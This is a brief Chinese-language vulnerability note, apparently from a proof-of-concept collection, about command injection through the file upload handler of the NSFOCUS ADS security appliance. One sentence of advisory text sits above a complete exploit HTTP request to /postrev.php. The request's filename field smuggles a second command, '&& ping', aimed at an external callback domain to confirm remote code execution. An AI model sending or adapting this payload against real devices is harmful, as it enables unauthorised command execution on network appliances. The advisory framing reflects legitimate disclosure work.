在绿盟ads中，发现一处文件上传漏洞，攻击者可以通过上传的文件名拼接命令进行命令注入。 经过分析与研判，该漏洞利用难度低，能够造成远程命令执行，建议尽快修复

POST /postrev.php HTTP/1.1
Host:
Content-Length: 252
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4x5B9V0rUBOl9UnJ
Connection: close

------WebKitFormBoundary4x5B9V0rUBOl9UnJ
Content-Disposition: form-data; name="filename"; filename="1.jpg && ping dtq9.callback.red"
Content-Type: image/jpeg


------WebKitFormBoundary4x5B9V0rUBOl9UnJ--


